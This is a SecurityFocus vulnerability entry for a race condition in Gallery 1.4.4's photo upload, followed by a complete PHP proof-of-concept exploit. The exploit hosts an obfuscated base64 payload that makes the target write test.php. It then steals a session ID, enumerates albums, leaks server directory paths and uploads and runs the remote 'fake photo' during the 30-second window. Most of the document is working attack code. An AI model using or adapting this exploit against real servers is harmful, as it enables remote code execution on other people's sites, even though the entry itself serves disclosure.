source: http://www.securityfocus.com/bid/10968/info

A vulnerability is reported to exist in Gallery that may allow a remote attacker to execute malicious scripts on a vulnerable system. This issue is a design error that occurs due to the 'set_time_limit' function. 

The issue presents itself becuase the 'set_time_limit' function forces the application to wait for 30-seconds before the verification and discarding of non-image files takes place. This allows for a window of opportunity for an attacker to execute a malicious script on a server.

Gallery 1.4.4 is reported prone to this issue, however, other versions may be affected as well.

This is the content of galfakeimg.php. It has to be placed in a
remote web directory accessible by the gallery script.

---8-<-------------------------8-<-------------------------8<---
<?php
echo "<?php
\$f=fopen(trim(base64_decode(dGVzdC5waHAg)),w);fputs(\$f,trim(base64_decode(PD8gZWNobyAnPHByZT4gXCAgLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCAgLzxicj4gKE9vKSAgVGhpcy
BnYWxsZXJ5IGlzIHZ1bG5lcmFibGUgISAgKG9PKTxicj4vL3x8XFxcXCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vfHxcXFxcIDwvcHJlPic7Pz4K)));fclose(\$f);
?>\n";
for($x=0;$x<65535;$x++) echo " \n";
while(1){}
?>
---8-<-------------------------8-<-------------------------8<---

*/


define( XEC_TIMEOUT, 5);

echo "+--------------------------------------------------------------+\n|
Gallery 1.4.4 save_photos.php PHP Insertion Proof of Concept |\n| By
aCiDBiTS acidbits@hotmail.com 17-August-2004
|\n+--------------------------------------------------------------+\n\n";


if($argc<3) die("Usage: ".$argv[0]." URL_to_fake_photo
URL_to_Gallery\n\n");
$host=$argv[2];
if(substr($host,strlen($host)-1,1)!='/') $host.='/';
$fakephoto=$argv[1];

echo "[+] Obtaining PHPSESSID ... \n ";
$webc=get_web($host."view_album.php?set_albumName=".$album[0], 1, '');
$temp=explode("PHPSESSID=",$webc);
$temp1=explode(";",$temp[1]);
$phps="PHPSESSID=".$temp1[0].";";
echo $phps;

echo "\n\n[+] Getting album names ...\n ";
$webc=get_web($host, 0, $phps);
$temp=explode("set_albumName=",$webc);
$nalbum=0;
while($temp[($nalbum*2)+1]){
$temp1= explode( "\"", $temp[($nalbum*2)+1]);
$album[$nalbum]=$temp1[0];
echo $album[$nalbum]." ";
$nalbum++;
}
if(!$nalbum) die(" Failed!\n\n");


echo "\n\n[+] Searching an album with permissions to add photos ...";
$walbum='';
foreach( $album as $temp){
$webc=get_web($host."view_album.php?set_albumName=".$temp, 0, $phps);
$webc=send_post( $host."save_photos.php",
urlencode("urls[]=".$host."&setCaption=1"), $phps);
echo "\n ".$temp." -> ";
if( ereg( "You are no allowed to perform this action", $webc) )
echo "No";
else {
echo "Yes";
$walbum=$temp;
}
}
if( !$walbum ) die ("\n\nFailed! No permissions in any album.\n\n");
echo "\n Using: ".$walbum;

echo "\n\n[+] Getting gallery & temporal directory paths ...";
$webc=get_web($host."view_album.php?set_albumName=".$walbum, 0, $phps);
$temp='/';
for($x=0;$x<256;$x++) $temp.='a';
$webc=send_post( $host."save_photos.php",
urlencode("urls[]")."=".urlencode($fakephoto.$temp)."&setCaption=1", $phps);
$temp=explode("fopen(\"",$webc);
$temp1=explode("photo",$temp[1]);
$tmpd=$temp1[0];
echo "\n Temporal directory: ".$tmpd;
$temp=explode("resource in <b>",$webc);
$temp1=explode("save_photo",$temp[1]);
$scrptd=$temp1[0];
echo "\n Gallery directory: ".$scrptd;

if( !ereg( $scrptd, $tmpd) ) die ("\n\nTemporal directory is out of
gallery's webtree. Can't continue.\n\n" );

$temp=explode("/",$fakephoto);
end($temp);
$sname=current($temp);
echo "\n\n[+] Uploading $sname and executing it ...";
$webc=send_post( $host."save_photos.php",
urlencode("urls[]")."=".urlencode($fakephoto)."&setCaption=1", $phps);
//Maybe you'll need to wait some more seconds, check XEC_TIMEOUT
$webc=get_web($host.str_replace($scrptd,'',$tmpd)."photo.".$sname, 0,
$phps);

echo "\n\n Now go to: ".$host.str_replace($scrptd,'',$tmpd)."test.php";

die("\n\n \ / \ /\n (Oo) Done! (oO)\n //||\\\//||\\\\\n\n");


function get_web($url, $h, $cookie)
{
$ch=curl_init();
curl_setopt ($ch, CURLOPT_URL, $url);
curl_setopt ($ch, CURLOPT_HEADER, $h);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
$data=curl_exec ($ch);
curl_close ($ch);
return $data;
}

function send_post($url,$data, $cookie)
{
$ch=curl_init();
curl_setopt ($ch, CURLOPT_URL, $url );
curl_setopt ($ch, CURLOPT_HEADER, 0);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $data );
curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
curl_setopt ($ch, CURLOPT_TIMEOUT, XEC_TIMEOUT) ;
$data=curl_exec ($ch);
curl_close ($ch);
return $data;
}